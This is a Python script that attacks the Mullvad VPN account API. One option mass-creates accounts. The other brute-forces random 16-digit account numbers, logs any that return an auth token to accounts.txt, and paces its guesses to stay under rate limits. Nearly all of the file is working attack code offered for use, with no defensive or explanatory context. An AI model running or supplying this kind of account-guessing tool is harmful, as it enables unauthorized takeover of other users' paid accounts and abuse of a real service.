import requests
import json
import random
from os import system, name
import time

def cls():
    if name == "nt":
        system("cls")
    else: system("clear")
    
cls()

headers = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Content-Type": "application/json",
}

def Random(n):
    start = 10**(n-1)
    end = (10**n)-1
    return random.randint(start, end)

def Gen():
    data = {}
    resp = requests.post("https://api.mullvad.net/www/accounts/", headers=headers, json=data)
    genj = json.loads(resp.text)
    print("ID: " + genj["account"]["pretty_token"])
    
def guess():
    n = 10
    randnum = Random(16)
    resps = requests.get("https://api.mullvad.net/www/accounts/" + str(randnum), headers=headers)
    if "auth_token" in resps.text:
        print("Successful ID: " + str(randnum))
        file1 = open("accounts.txt","a")
        file1.write(str(randnum) + "\n")
        file1.close()
    elif resps.status_code == 503:
        print("Warning: Rate limit broken!")
        quit()
    else:
        print("Not Working: " + str(randnum))
        print(resps.status_code)
        file2 = open("bad.txt","a")
        file2.write(str(randnum) + "\n")
        file2.close()
                
while True:
    print("[1] Account Generator")
    print("[2] Account Bruteforcer")
    choice = input("> ")
    if choice == "1":
        print()
        print("How many accounts do you want to create?")
        numgen = input("> ")
        print()
        for x in range(int(numgen)):
            Gen()
        print()
            
    elif choice == "2":
        print()
        print("How many accounts do you want to guess?")
        num_of_guesses = input("> ")
        print()
        for i in range(int(num_of_guesses)):
            guess()
            time.sleep(300)
        print()

    else: print(); print("Wrong choice!"); print()
